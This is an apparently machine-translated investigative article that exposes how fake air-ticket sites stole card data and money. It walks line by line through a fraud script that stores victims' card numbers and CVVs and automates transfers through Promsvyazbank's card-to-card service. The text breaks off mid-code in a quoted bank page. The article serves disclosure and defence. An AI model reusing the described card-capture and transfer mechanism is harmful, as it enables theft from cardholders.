<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Cheap flights ... A network of fraudulent sites that steal money from cards. The second investigation. What does the Promsvyazbank?</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="About a month ago I published on Geektimes an article ‚ÄúCheap flights ... Or a network of fraudulent sites that steal money from cards. My investigatio...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Cheap flights ... A network of fraudulent sites that steal money from cards. The second investigation. What does the Promsvyazbank?</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/dd5/971/335/dd59713351a348f29efad6370c8596f4.png"><br><br>  About a month ago I published on Geektimes an article <a href="https://geektimes.ru/post/280844/">‚ÄúCheap flights ... Or a network of fraudulent sites that steal money from cards.</a>  <a href="https://geektimes.ru/post/280844/">My investigation. ‚ÄùThe</a> publication received a great response and an unexpected continuation ... <br><br>  Let me remind you for those who have not read the first part.  In the publication on the basis of real cases, schemes have been described by which fraudsters steal money from the cards of air ticket buyers, who had the imprudence to get on a fake ticket site.  The number of such fraudulent websites selling air tickets in RuNet is estimated in tens and hundreds (including closed ones).  On such sites, the user is first shown the actual information about the flights, it is proposed to place an order and pay for it by credit card.  Everything looks beautiful until the air ticket buyers find that they are left without money and without tickets. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      In all detected cases, such websites use bank services to transfer money from card to card (P2P) to steal money.  In the first part, the mechanism of how the Tinkoff Bank page for payment from card to card is disguised and embedded on fraudulent sites was disassembled in detail, so that the ‚Äúbuyer‚Äù did not notice anything.  Promsvyazbank was also mentioned - it was through him that the money from the victim‚Äôs card in the story that was described was stolen.  And if there were no questions left with the TKS Bank, in the case of Promsvyazbank, it was not clear how the money was withdrawn.  The main script, which was used to steal money, was executed on the server side, and without the source codes it was possible to only guess what it was doing. <br><br>  <b>And one of the users of Geektimes contacted me and sent the same script payp2p.php, which was used recently on a large part of fraudulent sites for the sale of tickets.</b>  This script uses the Promsvyazbank service to transfer from card to card.  And in my opinion, Promsvyazbank, by providing its service, which was easy to deceive, contributed to the growth in the number of Internet fraudsters. <a name="habracut"></a><br><br>  Probably, there are other similar banks, but this publication mainly focuses on Promsvyazbank. <br><br>  Before we start analyzing the script itself, let's see how the payment page of the fraudulent site looked like and what the transfer page from card to card of Promsvyazbank looks like. <br><br>  It looked like a payment page on fraudulent sites <br><img src="https://habrastorage.org/files/fe3/cf3/6d5/fe3cf36d5d294c8aa50b4338e9efde03.jpg">  When analyzing the HTML code of this payment page, I did not find any parts of the pages of any banks, do not use embedded iframe windows, do not use scripts at all, and the page itself is very simple and does not look like the Promsvyazbank page.  The data entered into the form is not checked by scripts, but by the mechanisms built into the browsers using the ‚Äúpattern‚Äù and ‚Äúrequired‚Äù attributes for input fields and for drop-down select lists.  Those.  even a page stored in a browser on a local disk is then ‚Äúworkable‚Äù and can be used to test how the card data is intercepted.  A similar page previously saved was used within this publication in order to understand how the script works. <br><br>  In fact, this page is just a form for entering the card number.  Upon confirmation of the form, the processing is transferred to the program payp2p.php. <br><br><pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"b-card-feature-list clearfix"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"formPay"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">action</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"payp2p.php"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">method</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"post"</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  The program payp2p.php can do anything.  Its code was previously unavailable to us, since it is executed on the server side.  But as I wrote, now we have the code, and we know everything. <br><br>  Now let's see how the payment page from card to card looks like on Promsvyazbank website. <br><br> <code>https://www.psbank.ru/Personal/eCommerce/Card2Card</code> <br> <img src="https://habrastorage.org/files/40d/469/71c/40d46971c2414e28bd4ef695c1e0d665.png"><br><br>  As you can see, the Promsvyazbank page is not at all like the payment page presented earlier.  Even the number of fields for entering the card number does not match. <br><br>  Let's see the HTML code of the Promsvyazbank page to figure out how it works.  All we need to know is in these few lines: <br><br><pre> <code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"card2card"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://3ds.payment.ru/P2P/card_form.html"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"100%"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"100%"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">frameborder</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"no"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">seamless</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">scrolling</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"no"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  This piece means that the real payment page is located on a different domain, and what we see on Promsvyazbank‚Äôs website is displayed in the ‚Äúwindow‚Äù using the iframe technology. <br><br><div class="spoiler">  <b class="spoiler_title">I wonder who owns the domain 3ds.payment.ru?</b> <div class="spoiler_text">  Check on the basis of whois. <br><br> <code> 3ds.payment.ru <br> IP 193.200.10.116 <br>  : PRSBM-NET <br> : <br> inetnum: 193.200.10.0 - 193.200.10.255 <br> netname: PRSBM-NET <br> mnt-by: PROMSVYAZBANK-MNT <br> <br> C    online.payment.ru <br> <img src="https://habrastorage.org/files/78b/0d3/8be/78b0d38be13f47f58128095526817a54.png"> <br></code> <br></div></div><br>  Domain 3ds.payment.ru also belongs to Promsvyazbank.  We will remember this domain, we will meet it in the description more than once. <br><br>  Let's see what the page that Promsvyazbank is building on its website, and, possibly, some other websites, is. <br><br> <code>https://3ds.payment.ru/P2P/card_form.html</code> <br> <img src="https://habrastorage.org/files/bf7/543/441/bf754344157647e1acf1fb55454c3179.png"><br><br>  This is the real page that is used for transfers from card to card.  As you can see, this page is borderless.  This was done specifically to make it easier to build in other sites. <br><br>  In the HTML code of this page we are interested in this part: <br><br><img src="https://habrastorage.org/files/8f5/996/3a5/8f59963a5d8c493aa4a38a90c911b92b.png"><br><br>  These are hidden input fields for storing service information.  We will also remember this page.  And where it is used will be explained later. <br><br>  The prologue is finished, let's move on to the most interesting and figure out how the payp2p.php script works or how it worked. <br><br>  The script is simple and for its understanding does not require any deep knowledge of the PHP programming language.  For the convenience of parsing, I broke it into pieces.  On the left are the line numbers that can be referenced.  The script is given completely unchanged in the form in which it was received.  After each piece of code will be presented decoding and an example of the values ‚Äã‚Äãof variables during the execution of the program (ie, something similar to debugging).  In some places, there may be excessive commenting, this is done so that readers who are not related to programming can also understand the meaning of the program code. <br><br>  For testing, we will need a form in which you will need to enter the card data with which payment is supposed.  Use the previously saved form.  How the form on the fraudulent site looked is shown in the picture at the beginning of the article.  About the form will be further written below.  For testing, we enter the card number 1111.2222.3333.4444. <br><br>  Let's start. <br><br><img src="https://habrastorage.org/files/f45/3a9/754/f453a9754241406eb6089527f5e25336.png"><br><br>  Line 3 - does not execute any commands. <br>  Line 4 - A separate dbconfig.php file is loaded in which the parameters for connecting to the MySQL database are stored.  A screenshot of dbconfig.php code and its analysis is below. <br>  Line 6 - we are connecting to the MySQL server, in the base of which we will then store data about the stolen cards and about the money transfers.  This line simultaneously connects to the MySQL server and exits the program if the connection failed for some reason. <br>  Line 11 - choose the encoding for working with the MySQL database. <br>  Line 13 - We connected to the MySQL server earlier; now we select the database we will work with. <br><br>  The payp2p.php script starts its work after a deceived user on a page similar to a regular online payment page fills out a form.  By clicking on the form of the "Pay" button, the payp2p.php script receives the data entered in the form.  Data from the form to the script is transmitted by the POST method. <br><br>  Line 16 - the credit card number entered in the form on the previous page is saved in the $ num variable. <br>  Line 17 - the Month / Year of the card expiration date is stored in the $ date variable. <br>  Line 18 - the CVV code of the card is stored in the $ cvv variable. <br>  Line 19 - the $ code stored in the $ code variable is preserved when a ‚Äúair ticket order‚Äù is issued.  This code is used to enable the user to view his order through a special link.  The same code is used to identify the order (on the payment page, to automatically display the amount to pay; when saved to the ‚Äúsales book‚Äù that fraudsters lead; this code is also transferred to the payment form, probably as a transfer identifier (see below). <br>  Lines 21-22 A string is formed - a SQL query, which is then executed.  The SQL query adds to the 'card' table the values ‚Äã‚Äãof the order ID, the amount, the expiration date of the card, the CVV of the card code, and the exact current time.  An example of writing to the database is below. <br><br><div class="spoiler">  <b class="spoiler_title">Sample debug information</b> <div class="spoiler_text"><img src="https://habrastorage.org/files/051/283/424/0512834248fd4c1fa7498ed3f98e72e7.png"><br><br>  Hereinafter, on similar screenshots, instead of the phrase ‚Äúvariable content‚Äù, it would be more correct to write ‚Äúvariable value‚Äù.  This I noticed late when the screenshots were ready.  Please do not judge strictly. <br><br>  "√¢b√®√¢" = 'driven in' when converting ISO8859-1 encoding =&gt; Windows-1251 <br>  Why this signature, I do not know.  Perhaps a typo. </div></div><br>  Temporarily switch our attention temporarily to the dbconfig.php file. <br><br><img src="https://habrastorage.org/files/100/d2a/13b/100d2a13b3544f60afeeab0efc768b85.png"><br><br>  Here you can set the parameters for connecting to the database.  From what might be interesting: <br><br><blockquote>  DBHOST is the name of the host on which the MySQL server is running (in this example, the MySQL database is located on the same server where the executable files are stored, but theoretically it can be on a third-party server) <br>  DBNAME - Database Name <br>  DBUSER - Username for connecting to MySQL database <br>  DBPASS - Password to connect to MySQL database <br>  SECURE_AUTH_KEY - the secret key to connect to something without using passwords.  For what exactly this key was used, from those files that were available, it is not clear.  The key code in the screenshot is changed. </blockquote><br><img src="https://habrastorage.org/files/c5c/9bf/0b1/c5c9bf0b1afb4d8ba298ce8953076dee.png"><br><br>  Line 28 - a third-party aviacfg.php file is included.  This is a configuration file that stores recipient card numbers and other settings. <br>  Line 29 - An array is created from the card numbers that are separated by a line break in the configuration file. <br>  Line 30-31 - The variable $ crd is randomly assigned the number of one of the cards. <br><br>  Let's see what we have in the file aviacfg.php <br><br><img src="https://habrastorage.org/files/14b/2bd/b16/14b2bdb16dc74b7990b743146d9bc72c.png"><br><br>  Here we see that the $ aviacfg variable is an array that contains discount values, and cards (card numbers to which funds are supposed to be withdrawn).  In this example, only one card number, but they can be any number.  The name of the file (aviacfg.php) and the variable ($ aviacfg) indicates for which area this script was sharpened.  The discount value determines what percentage of the price on a fraudulent site will be cheaper than they are actually sold on an ‚Äúhonest‚Äù ticket sales site.  The owner of a fraudulent site can quickly make the displayed ticket price cheaper.  The lower the displayed price, the greater the likelihood that one of the potential buyers will risk buying tickets on an unfamiliar website.  About the discount will be even later comment how exactly it is implemented in the code. <br><br><img src="https://habrastorage.org/files/dd5/971/335/dd59713351a348f29efad6370c8596f4.png"><br><br>  Next, the amount of the transfer, the number of the card to which the transfer is made, and the code that identifies the order for airline tickets on the fraudulent website is saved in the MySQL Database.  An example of a record in the database will be presented below. <br><br><div class="spoiler">  <b class="spoiler_title">Sample debug information</b> <div class="spoiler_text"><img src="https://habrastorage.org/files/4ee/0e7/b46/4ee0e7b46d584bb68631adb4339b86e9.png"><br></div></div><br><img src="https://habrastorage.org/files/111/e13/e09/111e13e09e2246b4bbb9a3cdb6cab651.png"><br><br>  Line 40 - the $ p112 variable is assigned a value with the card number that was previously entered on the form. <br>  Lines 41-51 - The card number is divided into four digits. <br>  Lines 53-57 - The length of the card number is checked.  If the number of characters in the card number differs from 16 or 18, then there is an exit.  A message is displayed for five seconds, then redirected to another page.  In this example, the return will be on the page with the order on the fraudulent site. <br>  In line 56 ‚ÄúIaaa? Iua aaiiua ea? Ou‚Äù when converting ISO8859-1 encoding =&gt; Windows-1251 corresponds to the text: ‚ÄúInvalid card data‚Äù. <br>  Lines 58-61 - the variables $ p4, $ p5, $ p6, $ p11 are assigned the values ‚Äã‚Äãentered earlier in the form (card expiration date, CVV code, payment amount). <br>  Line 63 - The $ info variable stores all card data and the transfer amount.  Forming, line breaks "\ n" and separators "### ..." are used.  This variable is not used anywhere else.  When finalizing the script, it can be used to save records to a plain text file or to display on screen when debugging. <br><br><div class="spoiler">  <b class="spoiler_title">Sample debug information</b> <div class="spoiler_text"><img src="https://habrastorage.org/files/413/f55/39d/413f5539d0fa45f3aee1853c62d0005f.png"><br></div></div><br><img src="https://habrastorage.org/files/347/9f7/0d5/3479f70d54804bb2b25f111021820c1c.png"><br><br>  Lines 66-75 - This is actually a duplication of a block of lines 27-36.  Once again, the recipient's card is selected randomly from the aviacfg.php configuration file, and all this is saved in the card_balance database table.  Thus, two entries will be created in the card_balance table for each transfer attempt.  If only one recipient card is clogged in aviacfg.php, with a random sample, of course, the same card will always be chosen.  In this case, the records in the card_balance table are simply duplicated.  But if several card numbers are scored in aviacfg.php, with a random sample, the results will be different and there will be one record in the card_balance table, the first one is incorrect and the second one is correct. <br><br>  This is a mistake, and script buyers (there will be a separate comment about them) may ask the developer to compensate for moral damage due to the fact that there are at least two times less real translations than log entries. <br><br><div class="spoiler">  <b class="spoiler_title">Sample debug information</b> <div class="spoiler_text"><img src="https://habrastorage.org/files/33b/867/4db/33b8674db56f462ba652d8caf33b418a.png"><br></div></div><br><div class="spoiler">  <b class="spoiler_title">Sample MySQL database entries</b> <div class="spoiler_text">  I did not have a database and its structure.  Therefore, we had to create a new database and in it two tables: "card" and "card_balance".  Since in the script code the data is inserted into the table without referring to the table fields by name, for testing the name of the fields and their type were set approximately appropriate by context. <br><br>  The fact that in the example there are many identical entries in each table is the result of repeated testing.  Normally, the records will be different. <br><br>  Table "card". <br><br><img src="https://habrastorage.org/files/4e9/e3c/454/4e9e3c45420a4d84b73a857184fe7155.jpg"><br><br>  Table "card_balance". <br><img src="https://habrastorage.org/files/98c/4a0/355/98c4a03559ba40e8a46adb2fdf950b54.jpg"><br></div></div><br>  Please note that in the first case, the data on the sender cards without the sum, but with the exact time, is stored in the MySQL database table, and in the second case, the data on the performed transfers (more precisely, on transfer attempts) is stored.  The recipient's card number and amount are saved, the sender data in the second table is not saved.  In both cases, the ‚Äúorder ID‚Äù is additionally stored. <br><br>  The first part of the script, which was described above, can be called the ‚Äúsales book entry for accounting‚Äù.  She has nothing to do with the transfer of money.  To transfer money, you can do without saving data to the database.  Nevertheless, we see that the card data is saved, which means that in the future they can be additionally used to steal money from cards ‚Äúin manual mode‚Äù.  Card data can be sold or used, for example, to pay for advertising in Yandex.Direct, as shown in the previous article. <br><br>  The second part of the script refers to the transfer of money through the Promsvyazbank website 3ds.payment.ru. <br><br><img src="https://habrastorage.org/files/2b4/0cb/7fc/2b40cb7fc61f4b9598409fbfcc5ae00f.png"><br><br>  In line 78 in the commentary it is indicated that, it is assumed that the page of confirmation of successful payment has an address of the type "/sus.php?cd=BX3FKT".  If successful, the user should be returned to such an address. <br><br>  Line 80-91 In order to make a transfer, you must first go to the service page. <br><br>  <code>https://3ds.payment.ru/cgi-bin/get_trans_cond_p2p</code> . <br><img src="https://habrastorage.org/files/e04/5eb/8e4/e045eb8e4a4d42c6be37ff2946da439c.png"><br><br>  On this page, about this line is displayed: <br><br><pre> <code class="hljs json">{<span class="hljs-attr"><span class="hljs-attr">"ORDER_NUM"</span></span>:<span class="hljs-string"><span class="hljs-string">"20161027070425023400"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"TIMESTAMP"</span></span>:<span class="hljs-string"><span class="hljs-string">"20161027070425"</span></span>}</code> </pre> <br>  ‚ÄúORDER_NUM‚Äù is ~ ‚ÄúOrder Number‚Äù, ‚ÄúTIMESTAMP‚Äù is the current time stamp.  If the page is updated, new data is always displayed. <br><br>  In order to read some web page or send data to a web page, use the curl command.  Curl (cURL) allows you to programmatically connect to web servers using various protocols, including http and https.  In our case, curl is a software web browser that can save web pages to variables.  The page stored in a variable is a very long line with the source HTML code of this page.  You can work with such string variables in the same way as with any strings - you can search for text, replace text with itp.  Curl in the described scripts will be used several times. <br><br>  Line 80 - The URL is stored in the $ login_url variable. <br>  Line 81 - The URL is stored in the $ agent variable. <br>  Line 82 - Initializes the cURL session. <br>  Line 83-90 - Sets the parameters for the cURL session (the address of the page saved earlier in $ login_url; the browser identifier saved earlier in $ agent; the page you are navigating from or otherwise referring to the REFERER page; the COOKIE settings, etc.) <br>  Line 91 - As a result of the curl_exec command, a web page will be programmatically retrieved and saved to the $ page variable. <br>  Lines 93-95 The saved $ page webpage is the ‚Äúorder number‚Äù ORDER_NUM, which is stored in the $ ord variable. <br>  Lines 96-98 The saved $ page webpage contains the TIMESTAMP timestamp, which is stored in the $ tim variable. <br><br><div class="spoiler">  <b class="spoiler_title">Sample debug information</b> <div class="spoiler_text"><img src="https://habrastorage.org/files/416/148/8ba/4161488ba0f64c8d9575a7f973d3d841.png"><br></div></div><br><img src="https://habrastorage.org/files/6f6/35b/d05/6f635bd056d5466a956643acab2e3b30.png"><br><br>  Now the ‚Äúsoftware browser‚Äù needs to go to <code>https://3ds.payment.ru/P2P_ACTION/card_form.html</code> .  This is the same payment page, a screenshot of which was shown above.  This is a page with a form, part of the service fields of which is hidden.  A piece of HTML code with hidden input fields was shown above.  Some values ‚Äã‚Äãof these hidden fields need to be remembered in order to use them later when submitting the form. <br><br>  Line 99 - In the $ url variable save the page address. <br>  Line 100 - Set the parameters for the session with the URL (in this case, only the address of the page. The remaining settings remain the same). <br>  Lines 101-102 Delete the previously used $ page and $ part variables. <br>  Line 103 - As a result of the curl_exec command execution, a web page will be programmatically received, which will be saved to the $ page variable. <br>  Lines 104-106 The saved $ page webpage contains the value of the TERMINAL field, which is stored in the $ term variable. <br>  Lines 107-109 The saved $ page webpage contains the value of the TRTYPE field, which is stored in the $ type variable. <br>  Lines 110-112 The saved $ page webpage contains the value of the MERCHANT field, which is stored in the $ merch variable. <br>  Lines 113-115 The saved $ page web page contains the value of the EMAIL field, which is stored in the $ ml variable. <br><br>  In general, these values ‚Äã‚Äãin the specified form never change.  And they could be saved in the code as constants and not received every time.  Probably getting the values ‚Äã‚Äãof these fields is made for additional safety, in case sometime in the future one or more fields change. <br><br>  Description of some fields.  A complete description of all the fields is easy to find in Google. <br><br><blockquote>  TERMINAL - Unique number of the virtual terminal of the outlet <br>  MERCH_NAME - Name of the outlet <br>  MERCHANT - the outlet number assigned by the bank <br>  TRTYPE - Type of requested operation (Payment - 1, Cancellation - 22, Preauthorization - 0, Completion of calculations - 21) <br>  EMAIL - E-mail address to send alerts </blockquote><br><div class="spoiler">  <b class="spoiler_title">Sample debug information</b> <div class="spoiler_text"><img src="https://habrastorage.org/files/bf5/4a7/457/bf54a74574f44b1a8cb34bfa95eac091.png"><br>  In this example, you can see how web pages are stored in string variables.  ($ page) <br></div></div><br>  EMAIL here is an epic case.  Who cares, additional materials about this EMAIL at the end of the article in the application under the spoiler. <br><br><img src="https://habrastorage.org/files/9d4/cf1/5c9/9d4cf15c98584bc8a4dc45b78051ad26.png"><br><br>  Here we see a big block.  The fact that it looks great is explained by the limited width of the column in the publication and the convenient presentation of the code by the author of the script.  All the same could be placed in 10 lines of code, but the convenience of reading and editing the code would be affected. <br><br>  Line 120 - In the $ url variable save the page address. <br>  Line 121-123 - Set the parameters for the session with the CURL. <br>  Line 124 - an array of $ ncrd is created from the recipient's card number in the string $ crd variable, which will contain the parts of the card number, divided into fours. <br>  Line 125 - HTTP headers are stored in the $ headers array variable. <br>  Line 126 - Set parameters for a session withURL (HTTP headers from the $ headers variable. <br>  Lines 135-164 - An array of $ postL is created, each value of which will correspond to the form field on the payment page (sender card number, divided by four; sender card validity; sender CVC; recipient card number, divided by four; recipient card validity ; CVC of the recipient's card; payment amount; ‚Äúorder number‚Äù; description for the confirmation page; terminal number; name of the outlet; email for notifications; time stamp; unlit number of the sender card; unbroken number of the card will receive  data on software and hardware ‚Äúon the sender‚Äôs computer‚Äù, designed to create the appearance of a real user, not a script). <br>  Lines 135 - Set the parameters for the session withURL (the data transmitted in the HTTP POST request. At the same time, the $ postL array is converted to a string that is a url-encoded string, like <code>'p1=val1&amp;p2=val2&amp;...'</code> . <br><br>  More clearly transmitted data is shown in the screenshot with debugging information below. <br><br><div class="spoiler">  <b class="spoiler_title">Sample debug information</b> <div class="spoiler_text"><img src="https://habrastorage.org/files/9b0/140/642/9b0140642ef74fbf968fa4c299677a33.png"><br></div></div><br><img src="https://habrastorage.org/files/f9e/70e/ac8/f9e70eac88e74b088d3c37c1736eab09.png"><br><br>  Line 166 - As a result of the curl_exec command being executed programmatically using the POST method, the prepared data will be sent to the web page form.  For a web page, such a submission will look exactly the same as if a regular user filled out and confirmed the form in a regular browser.  The page with the result of sending data to the form will be saved to the $ page variable. <br>  Line 167 - The cURL session ends. <br>  Line 168 - In the resulting page, which is stored in the $ page variable, and as we remember, is a long line, the ‚ÄúError‚Äù substring is searched. <br>  Lines 169-173 - If the substring "Error" is found, then an error message "Card does not fit" is displayed for 5 seconds and then the script is exited with the redirection of the page displayed in the browser to the "page with the order".  If the user persists, he can once again try to go through the payment procedure. <br><br>  Displayed page in case of any error. <br><br><img src="https://habrastorage.org/files/2f6/7b0/d80/2f67b0d80a7e49b88b9432eacd6d9085.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The causes of errors that the bank gives out may be different (an error in the card number, insufficient funds, an authorization error, and many others). </font><font style="vertical-align: inherit;">But for the script payp2p.php there is no difference. </font><font style="vertical-align: inherit;">Once payment has failed, then the user is redirected to a page from which you can retry payment. </font><font style="vertical-align: inherit;">The page to which you return for an error can be easily changed depending on the task.</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Example of HTML code returned by the bank page, in case of error</font></font></b> <div class="spoiler_text"><pre> <code class="html hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">base</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">href</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/netcetera/netcetera.js"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="hljs-tag"><span class="undefined"></span><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/riskminder-client.js"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="hljs-tag"><span class="undefined"></span><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="javascript"> </span><span class="hljs-function"><span class="hljs-keyword"><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="javascript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="javascript"><span class="hljs-function"><span class="hljs-title">redirect</span></span></span></span><span class="javascript"><span class="hljs-function">(</span></span><span class="hljs-params"><span class="javascript"><span class="hljs-function"><span class="hljs-params">rctext, ext_diag_code</span></span></span></span><span class="javascript"><span class="hljs-function">)</span></span></span><span class="javascript">{ </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Call your bank"</span></span></span><span class="javascript">){ </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/CallYourBank"</span></span></span><span class="javascript">; } </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Your card is restricted"</span></span></span><span class="javascript">){ </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/ForbiddenTransaction"</span></span></span><span class="javascript">; } </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Your card is disabled"</span></span></span><span class="javascript">){ </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/BlockedCard"</span></span></span><span class="javascript">; } </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span 